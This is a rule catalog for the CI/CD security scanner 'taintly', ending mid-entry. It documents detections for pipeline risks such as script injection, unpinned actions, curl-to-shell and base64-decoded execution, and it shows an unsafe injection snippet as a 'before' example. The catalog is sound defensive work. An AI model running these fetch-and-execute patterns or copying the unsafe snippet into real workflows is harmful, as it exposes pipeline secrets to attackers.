# taintly Rule Catalog

All rules shipped with taintly. Each rule maps to an [OWASP CI/CD Security Risk](https://owasp.org/www-project-top-10-ci-cd-security-risks/) category and carries STRIDE threat-modelling metadata: primary threat categories (E=Elevation of Privilege, T=Tampering, I=Information Disclosure, S=Spoofing, R=Repudiation, D=Denial of Service), a 2-sentence attack narrative, and references to real-world incidents where the pattern was exploited.

---

## GitHub Actions Rules

### CICD-SEC-2: Inadequate Identity and Access Management

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC2-GH-001 | HIGH | Workflow grants write-all permissions |
| SEC2-GH-002 | MEDIUM | No explicit permissions defined |

#### SEC2-GH-001 — Workflow grants write-all permissions

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-2

Workflow grants write access to ALL scopes via `permissions: write-all`. If any step is compromised, the attacker has full read/write access to the repository and all resources.

**Remediation:** Replace with minimal required permissions per job:
```yaml
permissions:
  contents: read
  pull-requests: write  # only if needed
```

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication

---

#### SEC2-GH-002 — No explicit permissions defined

**Severity:** MEDIUM  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-2

Workflow does not define explicit permissions. Depending on org/repo settings, GITHUB_TOKEN may default to read-write access to all scopes.

**Remediation:**
```yaml
permissions:
  contents: read
```

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token

---

### CICD-SEC-3: Dependency Chain Abuse

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC3-GH-001 | HIGH | Unpinned action (mutable tag reference) |
| SEC3-GH-002 | CRITICAL | Action pinned to branch reference |
| SEC3-GH-003 | CRITICAL | Known compromised action referenced |
| SEC3-GH-005 | HIGH | Docker container action without digest pinning |

#### SEC3-GH-001 — Unpinned action (mutable tag reference)

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

Action referenced by mutable tag instead of commit SHA. Tags can be force-pushed to point at malicious code — a technique used in documented supply chain attacks against popular GitHub Actions (Trivy, Checkmarx, tj-actions).

**Remediation:**
```yaml
# Before (UNSAFE)
- uses: actions/checkout@v4

# After (SAFE)
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4
```

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions

---

#### SEC3-GH-002 — Action pinned to branch reference

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

Action referenced by branch name (`@main`, `@master`). Branch references change with every commit — any push to the branch changes what your workflow runs.

**Remediation:** Pin to a specific commit SHA:
```yaml
# Before (MOST DANGEROUS)
- uses: some-org/deploy@main

# After (SAFE)
- uses: some-org/deploy@abc123def456abc123def456abc123def456abc1 # main@2026-03-01
```

---

#### SEC3-GH-003 — Known compromised action referenced

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

This workflow references an action documented in a supply chain attack:
- `aquasecurity/trivy-action` — involved in a documented supply chain attack
- `aquasecurity/setup-trivy` — involved in a documented supply chain attack
- `Checkmarx/kics-github-action` — involved in a documented supply chain attack
- `Checkmarx/ast-github-action` — involved in a documented supply chain attack
- `tj-actions/changed-files` — compromised (multiple documented incidents)

**Remediation:** Check project security advisories. Pin to confirmed-safe SHA or replace with alternative.

**References:**
- https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/

---

#### SEC3-GH-005 — Docker container action without digest pinning

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

Docker image referenced by tag instead of SHA256 digest. Image tags are mutable.

**Remediation:**
```yaml
# Before
- uses: docker://alpine:3.18

# After
- uses: docker://alpine@sha256:c5c5fda71656f28e49ac9c5416b3643eaa6a108a8093151d6d1afc9463be8e33
```

---

### CICD-SEC-4: Poisoned Pipeline Execution

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC4-GH-001 | CRITICAL | pull_request_target with untrusted PR checkout |
| SEC4-GH-002 | HIGH | pull_request_target trigger detected |
| SEC4-GH-003 | MEDIUM | workflow_run without conclusion check |
| SEC4-GH-004 | HIGH | Script injection via attacker-controlled GitHub context |
| SEC4-GH-005 | MEDIUM | Checkout persists credentials to disk |

#### SEC4-GH-001 — pull_request_target with untrusted PR checkout

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

Workflow uses `pull_request_target` AND checks out the PR author's code via `${{ github.event.pull_request.head.sha }}` or similar. This is the exact attack vector used in the Trivy supply chain compromise (March 2026).

**Use `--guide SEC4-GH-001` for detailed step-by-step remediation.**

**References:**
- https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/

---

#### SEC4-GH-004 — Script injection via attacker-controlled GitHub context

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

User-controlled value injected directly into a `run:` block. Attacker-controlled values include: PR title/body, issue title/body, comment body, commit message, branch names.

**Remediation:**
```yaml
# Before (UNSAFE — script injection)
- run: echo "${{ github.event.pull_request.title }}"

# After (SAFE — env var intermediary)
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

**References:**
- https://securitylab.github.com/resources/github-actions-untrusted-input/

---

### CICD-SEC-6: Insufficient Credential Hygiene

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC6-GH-001 | CRITICAL | Potential hardcoded secret in workflow |
| SEC6-GH-003 | MEDIUM | Long-lived cloud credentials instead of OIDC |

---

### CICD-SEC-7: Insecure System Configuration

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC7-GH-001 | MEDIUM | Self-hosted runner detected |

---

### AI / ML Risk (GitHub Actions)

| Rule ID | Severity | Title |
|---------|----------|-------|
| AI-GH-001 | CRITICAL | HuggingFace `trust_remote_code=True` executes code from the model repo |
| AI-GH-002 | MEDIUM | HuggingFace model / dataset downloaded without a pinned revision SHA |
| AI-GH-003 | HIGH | `torch.load()` without `weights_only=True` — pickle RCE on model load |
| AI-GH-004 | MEDIUM | Model artefact fetched in a job that runs no pickle / model scanner |
| AI-GH-005 | HIGH | LLM API call + attacker-controlled PR / issue context |
| AI-GH-006 | HIGH | AI coding-agent action on a fork-triggerable event |
| AI-GH-007 | HIGH | LLM output reaches a shell interpreter or `$GITHUB_ENV` / `$GITHUB_OUTPUT` |
| AI-GH-008 | HIGH | AI coding agent in a job that checks out attacker-controlled PR code |
| AI-GH-009 | CRITICAL | AI agent safety controls disabled on a fork-triggerable event |
| AI-GH-010 | HIGH | Non-torch pickle-backed loader without safety flag |
| AI-GH-011 | HIGH | MCP server loaded from a registry runner without a version pin |
| AI-GH-012 | HIGH | Privileged-scope MCP server on a fork-triggerable event |
| AI-GH-013 | HIGH | Agentic CLI invoked in a fork-triggerable workflow |

---

## GitLab CI Rules

### CICD-SEC-3: Dependency Chain Abuse

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC3-GL-001 | HIGH | Remote include without integrity verification |
| SEC3-GL-002 | HIGH | Project include without pinned ref |
| SEC3-GL-005 | HIGH | Docker image without digest pinning |

---

### CICD-SEC-6: Insufficient Credential Hygiene

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC6-GL-001 | CRITICAL | Potential hardcoded secret in pipeline config |
| SEC6-GL-002 | HIGH | curl piped to shell in script block |
| SEC6-GL-003 | HIGH | TLS verification disabled |
| SEC6-GL-004 | HIGH | eval usage in script block |
| SEC6-GL-005 | MEDIUM | chmod 777 in script block |

---

### CICD-SEC-10: Insufficient Logging and Visibility

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC10-GL-002 | MEDIUM | Public pipelines may expose job logs |

---

### AI / ML Risk (GitLab CI)

| Rule ID | Severity | Title |
|---------|----------|-------|
| AI-GL-001 | CRITICAL | HuggingFace `trust_remote_code=True` in a GitLab script |
| AI-GL-002 | HIGH | LLM output reaches a shell interpreter in a GitLab script |
| AI-GL-003 | HIGH | Non-torch pickle-backed loader without safety flag (GitLab) |

---

### AI / ML Risk (Jenkins)

| Rule ID | Severity | Title |
|---------|----------|-------|
| AI-JK-001 | CRITICAL | HuggingFace `trust_remote_code=True` in a Jenkins `sh` / `bat` step |
| AI-JK-002 | HIGH | `torch.load()` without `weights_only=True` in Jenkins |
| AI-JK-003 | HIGH | LLM output reaches a shell interpreter inside a Jenkins step |
| AI-JK-004 | HIGH | Non-torch pickle-backed loader without safety flag (Jenkins) |

Full per-rule detail is under [AI / ML Security Rules](#ai--ml-security-rules) below.

---

## GitHub Actions Rules

### CICD-SEC-10

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC10-GH-001 | LOW | GitHub Actions job has no timeout — unlimited runtime allowed |
| SEC10-GH-002 | LOW | Workflow produces build output but retains no artifacts for audit |

#### SEC10-GH-001 — GitHub Actions job has no timeout — unlimited runtime allowed

**Severity:** LOW  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-10

A GitHub Actions job does not set 'timeout-minutes'. Without a timeout, a compromised or hung step can run indefinitely — up to the GitHub-imposed maximum of 6 hours for public repos (35 days for self-hosted runners). An attacker who achieves code execution in a job step could exfiltrate secrets, interact with downstream systems, or mine cryptocurrency for the full duration without triggering any time-based alert. Setting an explicit timeout limits the blast radius and makes anomalous run durations immediately visible in the Actions UI and logs.

**Remediation:** Set an explicit 'timeout-minutes' on each job (or at workflow level):

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30   # Fail the job if it exceeds 30 minutes
    steps:
      - ...

Choose a timeout that is at least 2x your typical build duration. GitHub's default is 360 minutes (6 hours) — far too long for most jobs.

**References:**
- https://docs.github.com/en/actions/writing-workflows/workflow-syntax-for-github-actions#jobsjob_idtimeout-minutes

---

#### SEC10-GH-002 — Workflow produces build output but retains no artifacts for audit

**Severity:** LOW  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-10

A workflow that builds, packages, or deploys software does not upload any build artifacts. Without retained artifacts, there is no evidence trail to support post-incident forensics after a supply chain compromise. Investigators cannot verify what binaries were produced at a given commit, compare them to what was deployed, or detect tampering that occurred inside the build. At minimum, upload build manifests, SBOMs, or signed digests as artifacts to establish a verifiable record tied to the workflow run.

**Remediation:** Upload build outputs and manifests as workflow artifacts:

- name: Upload build artifacts
  uses: actions/upload-artifact@v4
  with:
    name: build-${{ github.sha }}
    path: dist/
    retention-days: 90

For stronger integrity, also generate and upload an SBOM:
- uses: anchore/sbom-action@v0
  with:
    artifact-name: sbom-${{ github.sha }}.spdx.json

**References:**
- https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/storing-and-sharing-data-from-a-workflow

---

### CICD-SEC-2

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC2-GH-004 | CRITICAL | Hardcoded credentials in container or services block |

#### SEC2-GH-004 — Hardcoded credentials in container or services block

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-2

A container: or services: block contains username/password credentials as literal string values rather than secrets references. Container registry credentials committed to workflow files are exposed to anyone with read access to the repository.

**Remediation:** Use secrets for container registry authentication:
container:
  image: private-registry.example.com/app:latest
  credentials:
    username: ${{ secrets.REGISTRY_USERNAME }}
    password: ${{ secrets.REGISTRY_PASSWORD }}

**References:**
- https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/running-jobs-in-a-container

---

### CICD-SEC-4

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC4-GH-006 | CRITICAL | Attacker-controlled value written to GITHUB_ENV |
| SEC4-GH-007 | HIGH | Attacker-controlled value written to GITHUB_OUTPUT |
| SEC4-GH-008 | HIGH | workflow_dispatch inputs used directly in shell (not via env var) |
| SEC4-GH-009 | HIGH | Insecure workflow commands re-enabled |
| SEC4-GH-010 | HIGH | Security gate uses spoofable github.actor bot check |
| SEC4-GH-011 | CRITICAL | Living-off-the-pipeline tools run in pull_request_target context |
| SEC4-GH-012 | HIGH | secrets: inherit passes all caller secrets to called workflow |
| SEC4-GH-013 | HIGH | if: block-scalar condition always evaluates true |
| SEC4-GH-014 | HIGH | Attacker-controlled value laundered through step output into shell command |
| SEC4-GH-015 | HIGH | Build matrix value sourced from attacker-controlled event context |
| SEC4-GH-016 | HIGH | Reusable workflow called with attacker-controlled event context as input |

#### SEC4-GH-006 — Attacker-controlled value written to GITHUB_ENV

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

Attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) is written directly to $GITHUB_ENV. This sets environment variables for ALL subsequent steps — equivalent to arbitrary code execution. Any step after this can read the injected variable, including privileged deploy steps.

**Remediation:** Never write attacker-controlled values to $GITHUB_ENV.
If you must pass the value, validate and sanitize it first, then use an intermediate env var:
env:
  SAFE_TITLE: ${{ github.event.pull_request.title }}
run: echo "TITLE=${SAFE_TITLE//[^a-zA-Z0-9 _-]/}" >> $GITHUB_ENV

**References:**
- https://securitylab.github.com/resources/github-actions-untrusted-input/

---

#### SEC4-GH-007 — Attacker-controlled value written to GITHUB_OUTPUT

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

Attacker-controlled GitHub context value written directly to $GITHUB_OUTPUT. Step outputs can be consumed by subsequent steps and jobs. If a downstream step uses this output in a shell command or another $GITHUB_ENV write, it enables chained injection.

**Remediation:** Validate and sanitize attacker-controlled values before writing to $GITHUB_OUTPUT.
Prefer using env vars as intermediaries and strip shell metacharacters.

**References:**
- https://securitylab.github.com/resources/github-actions-untrusted-input/

---

#### SEC4-GH-008 — workflow_dispatch inputs used directly in shell (not via env var)

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

workflow_dispatch input values (${{ inputs.* }} or ${{ github.event.inputs.* }}) used directly in workflow expressions outside of a safe env: assignment. Manually triggered inputs are user-controlled and may contain shell metacharacters. Exploited in the Langflow and Ultralytics supply chain incidents (2024-2025).

**Remediation:** Pass inputs through env vars:
env:
  MY_INPUT: ${{ inputs.my_input }}
run: echo "$MY_INPUT"

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-scripts-to-handle-untrusted-input

---

#### SEC4-GH-009 — Insecure workflow commands re-enabled

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

ACTIONS_ALLOW_UNSECURE_COMMANDS=true re-enables the deprecated ::set-env:: and ::add-path:: workflow commands. These were disabled by GitHub in 2020 because any step that can write to stdout can inject environment variables or PATH entries, achieving arbitrary code execution. There is no legitimate reason to re-enable this.

**Remediation:** Remove ACTIONS_ALLOW_UNSECURE_COMMANDS entirely. Use $GITHUB_ENV and $GITHUB_OUTPUT file-based commands instead of ::set-env:: and ::add-path::.

**References:**
- https://github.blog/changelog/2020-10-01-github-actions-deprecating-set-env-and-add-path-commands/

---

#### SEC4-GH-010 — Security gate uses spoofable github.actor bot check

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

Workflow uses github.actor == 'dependabot[bot]' (or similar) as a security gate to grant elevated permissions or skip checks. The actor field reflects the LAST actor to interact, not the PR author. An attacker can push a follow-up commit after a Dependabot update to inherit the bot's trust level. Used in confused-deputy attacks and Dependabot auto-merge bypasses.

**Remediation:** Use github.event.sender.login or check the PR author via github.event.pull_request.user.login. For Dependabot auto-merge, use the official Dependabot metadata action and verify update-type, not the actor field.

**References:**
- https://woodruffw.github.io/zizmor/audits/bot-conditions/

---

#### SEC4-GH-011 — Living-off-the-pipeline tools run in pull_request_target context

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

Workflow uses pull_request_target AND runs build tools (npm, yarn, pip, make, gradle, mvn, cargo, bundle) that read attacker-controlled files (package.json, Makefile, pom.xml, build.gradle, etc.) from the PR branch. Even without explicit actions/checkout, some tools run lifecycle hooks from the repository root that can execute arbitrary attacker code. This pattern was exploited in the Ultralytics supply chain compromise (Dec 2024).

**Remediation:** Do not run build tools in pull_request_target workflows. Use the two-workflow pattern: pull_request for build/test (no secrets), workflow_run for privileged operations (no PR code execution).

**References:**
- https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/

---

#### SEC4-GH-012 — secrets: inherit passes all caller secrets to called workflow

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

secrets: inherit passes ALL secrets held by the caller workflow to the called reusable workflow. Any compromise of the called workflow (or its transitive dependencies) exposes every secret the caller has access to. Prefer explicitly listing only the secrets the called workflow actually needs.

**Remediation:** Replace 'secrets: inherit' with an explicit list:
secrets:
  DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}
Pass only the secrets the called workflow actually requires.

**References:**
- https://woodruffw.github.io/zizmor/audits/secrets-inherit/

---

#### SEC4-GH-013 — if: block-scalar condition always evaluates true

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A YAML block-scalar `if: |` makes the entire condition a multi-line string. In GitHub Actions, a non-empty string always evaluates to true, so this silently bypasses the access control check. Jobs and steps with this pattern run unconditionally regardless of the intended condition logic.

**Remediation:** Replace the block-scalar `if: |` with a standard inline condition:
if: github.event_name == 'push' && github.ref == 'refs/heads/main'

For long conditions spanning multiple lines, use the inline scalar with parentheses:
if: >
  github.event.inputs.foo != 'true'
  && github.event.inputs.bar != 'true'

**References:**
- https://woodruffw.github.io/zizmor/audits/if-always-true/

---

#### SEC4-GH-014 — Attacker-controlled value laundered through step output into shell command

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

An attacker-controlled GitHub context value (PR title, issue body, head_ref, etc.) is written to $GITHUB_OUTPUT in one step and then read back via ${{ steps.X.outputs.* }} in a subsequent run: block. This two-step pattern bypasses direct context injection rules by laundering the tainted value through a step output. The injection risk is identical to writing the context value directly into a run: block.

**Remediation:** Never interpolate step outputs directly in run: blocks when those outputs may contain attacker-controlled data.
Use an environment variable to shield the value from shell expansion:
  env:
    SAFE_VAL: ${{ steps.x.outputs.value }}
  run: use_command "$SAFE_VAL"
The shell will treat $SAFE_VAL as a single word, preventing injection.

**References:**
- https://securitylab.github.com/resources/github-actions-untrusted-input/

---

#### SEC4-GH-015 — Build matrix value sourced from attacker-controlled event context

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A GitHub Actions workflow defines a build matrix where at least one matrix value is sourced directly from the GitHub event context (github.event.*). Matrix values are used to parameterise parallel job runs — if an attacker controls the event payload (e.g. a pull request title, body, or label), they control what the matrix expands to. Depending on how matrix values are used in subsequent steps, this can lead to command injection, arbitrary file writes, or exfiltration of secrets. The `fromJSON()` pattern is especially dangerous: `strategy.matrix.include: ${{ fromJSON(github.event.inputs.matrix) }}` lets an attacker craft a matrix that spawns jobs with arbitrary configurations.

**Remediation:** Never source matrix values directly from event context.
Use workflow inputs with strict allowlists instead:

on:
  workflow_dispatch:
    inputs:
      target:
        type: choice
        options: [ubuntu-latest, windows-latest]

jobs:
  build:
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]  # static — never from event

If dynamic matrices are required, validate and allowlist the event value before constructing the matrix expression.

**References:**
- https://securitylab.github.com/resources/github-actions-untrusted-input/

---

#### SEC4-GH-016 — Reusable workflow called with attacker-controlled event context as input

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A GitHub Actions job calls an external reusable workflow and passes a value sourced from the event context (github.event.*) as a `with:` input parameter. Reusable workflows run with the caller's permissions and secrets. If the called workflow uses the passed input in a shell step without sanitization, an attacker who controls the event payload can achieve command injection inside the reusable workflow — with access to all secrets available to the caller. This risk is compounded because the injection point is in a different repository from where the payload originates.

**Remediation:** Sanitize or reject event-sourced values before passing to reusable workflows:

# BAD — attacker controls github.event.inputs.env
jobs:
  call:
    uses: org/repo/.github/workflows/deploy.yml@sha
    with:
      environment: ${{ github.event.inputs.env }}

# GOOD — use a choice input with strict allowlist
on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice
        options: [staging, production]

jobs:
  call:
    uses: org/repo/.github/workflows/deploy.yml@sha
    with:
      environment: ${{ inputs.environment }}  # constrained by allowlist

**References:**
- https://docs.github.com/en/actions/sharing-automations/reusing-workflows

---

### CICD-SEC-5

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC5-GH-001 | MEDIUM | id-token: write granted without any OIDC action present |

#### SEC5-GH-001 — id-token: write granted without any OIDC action present

**Severity:** MEDIUM  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-5

The workflow grants 'id-token: write' permission — which allows minting OIDC tokens that can authenticate to cloud providers — but does not use any OIDC-consuming action (aws-actions/configure-aws-credentials, google-github-actions/auth, azure/login, etc.). The permission is over-provisioned and unnecessarily expands token capabilities.

**Remediation:** Remove 'id-token: write' if OIDC is not used. If OIDC is used, ensure the consuming action is present and pinned to a SHA.

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect

---

### CICD-SEC-6

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC6-GH-004 | HIGH | All secrets serialized via toJSON(secrets) |
| SEC6-GH-005 | HIGH | Secret interpolated directly into shell command (not via env var) |
| SEC6-GH-006 | HIGH | Base64-encoded payload decoded and executed |
| SEC6-GH-007 | HIGH | curl/wget output piped directly to shell (GitHub Actions) |

#### SEC6-GH-004 — All secrets serialized via toJSON(secrets)

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-6

toJSON(secrets) serializes every secret the runner holds into a single JSON blob and passes it to a step. This bypasses GitHub's per-secret redaction in logs, massively over-exposes credentials, and makes secret hygiene impossible to audit. Any action receiving this value has access to all secrets.

**Remediation:** Pass only the specific secrets each step needs:
env:
  DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions

---

#### SEC6-GH-005 — Secret interpolated directly into shell command (not via env var)

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-6

A ${{ secrets.X }} expression is used inline in a context beyond a simple YAML key-value assignment. When secrets are interpolated directly into shell commands, the value is written to the generated script file on disk before execution, increasing exposure risk. It may also appear in shell history or process listings. Prefer mediation through an env: variable.

**Remediation:** Use env: to pass secrets to shell steps:
env:
  API_TOKEN: ${{ secrets.API_TOKEN }}
run: curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com

**References:**
- https://woodruffw.github.io/zizmor/audits/secrets-outside-env/

---

#### SEC6-GH-006 — Base64-encoded payload decoded and executed

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-6

A base64-encoded string is decoded and piped directly to a shell or eval. This is a known obfuscation technique used in supply chain attacks — Base64-encoded payloads have been used in documented supply chain attacks against popular GitHub Actions to evade static analysis. Legitimate workflows have no need to execute base64-encoded commands.

**Remediation:** Do not execute base64-encoded payloads. If you need to pass data to a script, write a named script file to the repo and execute it directly. Inline encoded payloads cannot be audited or reviewed.

**References:**
- https://woodruffw.github.io/zizmor/audits/obfuscation/

---

#### SEC6-GH-007 — curl/wget output piped directly to shell (GitHub Actions)

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-6

Script downloads and executes remote code in a single pipeline with no integrity verification. Covers curl|bash, wget|sh, bash <(curl ...), and PowerShell iex() patterns. If the remote server or CDN is compromised, arbitrary code runs with full access to the runner, including all mounted secrets.

**Remediation:** Download the script first, verify its checksum, then execute:
curl -fsSL -o install.sh https://example.com/install.sh
echo '<expected_sha256>  install.sh' | sha256sum -c -
bash install.sh

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/

---

### CICD-SEC-7

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC7-GH-002 | MEDIUM | GitHub Actions debug mode enabled |
| SEC7-GH-003 | HIGH | Self-hosted runner used for pull_request from external contributors |
| SEC7-GH-004 | MEDIUM | workflow_dispatch string input has no allowlist (options:) constraint |

#### SEC7-GH-002 — GitHub Actions debug mode enabled

**Severity:** MEDIUM  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-7

ACTIONS_RUNNER_DEBUG or ACTIONS_STEP_DEBUG is set to true. Debug mode dramatically increases log verbosity and frequently causes secrets to be printed to job logs in plain text. Debug mode being enabled in victim environments has been observed in supply chain attacks to confirm credential capture. This setting should never be hardcoded in workflows.

**Remediation:** Remove ACTIONS_RUNNER_DEBUG and ACTIONS_STEP_DEBUG from workflow files. If debug logging is needed temporarily, set it as a repository secret (GitHub will redact it from logs) or enable it via the Actions UI for a single run.

**References:**
- https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging

---

#### SEC7-GH-003 — Self-hosted runner used for pull_request from external contributors

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-7

Workflow uses the pull_request trigger (which runs for external fork PRs) combined with runs-on: self-hosted. This allows external contributors to execute arbitrary code directly on your persistent self-hosted runner infrastructure. Unlike GitHub-hosted runners, self-hosted runners persist state between jobs and have network access to internal resources.

**Remediation:** Use GitHub-hosted runners for pull_request workflows. If self-hosted runners are required, restrict to internal contributors only using branch protection rules and 'Require approval for all outside collaborators'.

**References:**
- https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security

---

#### SEC7-GH-004 — workflow_dispatch string input has no allowlist (options:) constraint

**Severity:** MEDIUM  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-7

A workflow_dispatch trigger defines an input with `type: string` but no `options:` list. Without an allowlist, the input accepts arbitrary free-text from anyone who can trigger the workflow manually or via the GitHub API. If the input value is used in a shell step, environment variable, or passed to another workflow, it becomes an injection vector. The `type: choice` input type restricts accepted values to a predefined list and is the correct choice for any input that influences execution logic rather than purely informational fields.

**Remediation:** Replace `type: string` with `type: choice` and enumerate allowed values:

on:
  workflow_dispatch:
    inputs:
      environment:
        type: choice          # was: string
        options:
          - staging
          - production

For inputs that genuinely require free text (e.g. a commit message), validate and sanitize the value before use in any shell command:
  run: |
    if [[ ! '${{ inputs.message }}' =~ ^[a-zA-Z0-9 .,!?-]+$ ]]; then
      echo 'Invalid input' && exit 1
    fi

**References:**
- https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows#providing-inputs

---

### CICD-SEC-8

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC8-GH-001 | HIGH | Job or service container image uses mutable :latest tag |
| SEC8-GH-002 | MEDIUM | Job or service container image has no version tag (implicit :latest) |
| SEC8-GH-003 | HIGH | External reusable workflow called without commit-SHA pinning |
| SEC8-GH-004 | HIGH | Service container runs with --privileged flag |

#### SEC8-GH-001 — Job or service container image uses mutable :latest tag

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-8

A job container or service container references a Docker image with the ':latest' tag. ':latest' resolves to whatever the registry currently points at — it changes silently on every push to the image repository. If the upstream image is compromised or updated unexpectedly, the new image executes inside your job with full access to all runner secrets and artefacts. Pin to a specific digest to guarantee the exact image version.

**Remediation:** Pin container images to a SHA256 digest:
  container:
    image: ubuntu@sha256:abc123...   # was ubuntu:latest

Find the current digest with:
  docker pull ubuntu:latest && docker inspect ubuntu:latest | grep RepoDigests

**References:**
- https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier

---

#### SEC8-GH-002 — Job or service container image has no version tag (implicit :latest)

**Severity:** MEDIUM  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-8

A job container or service container references a Docker image with no tag or digest. Docker resolves untagged references to ':latest' by default — effectively the same risk as ':latest' but less visible. The image version is uncontrolled and changes without any signal in the workflow.

**Remediation:** Always specify an explicit version tag and prefer digest pinning:
  container:
    image: ubuntu:22.04   # explicit tag
    # or
    image: ubuntu@sha256:abc123...   # digest pinned (best)

**References:**
- https://docs.docker.com/reference/cli/docker/image/pull/#pull-an-image-by-digest-immutable-identifier

---

#### SEC8-GH-003 — External reusable workflow called without commit-SHA pinning

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-8

A reusable workflow from an external repository is referenced by a mutable tag or branch instead of a full 40-character commit SHA. Reusable workflows run with the CALLER's secrets and permissions — a compromised or force-pushed tag gives an attacker access to every secret available to your workflow. The risk is higher than unpinned actions because the called workflow can itself call further nested workflows.

**Remediation:** Pin reusable workflow calls to a full commit SHA:
  uses: org/shared-workflows/.github/workflows/deploy.yml@abc123def456abc123def456abc123def456abc1  # v2.1.0

Find the current SHA with:
  git ls-remote https://github.com/org/shared-workflows refs/tags/v2.1.0

**References:**
- https://docs.github.com/en/actions/sharing-automations/reusing-workflows

---

#### SEC8-GH-004 — Service container runs with --privileged flag

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-8

A GitHub Actions service container is started with the `--privileged` Docker flag in its `options:` field. Privileged containers have full access to all Linux kernel capabilities and host devices — they can mount the host filesystem, escape the container namespace, load kernel modules, and interact with the Docker socket. On shared GitHub-hosted runners, a privileged container could potentially affect other tenants' jobs. On self-hosted runners, it can compromise the underlying host entirely. Service containers rarely require privileged mode — most use cases (databases, caches, message queues) work correctly without it.

**Remediation:** Remove the --privileged flag. Most service containers work without it:

services:
  postgres:
    image: postgres:16
    options: >-
      --health-cmd pg_isready
      --health-interval 10s
    # removed: --privileged

If your service genuinely requires elevated capabilities, request only the specific Linux capability it needs:
  options: --cap-add SYS_PTRACE  # instead of --privileged

**References:**
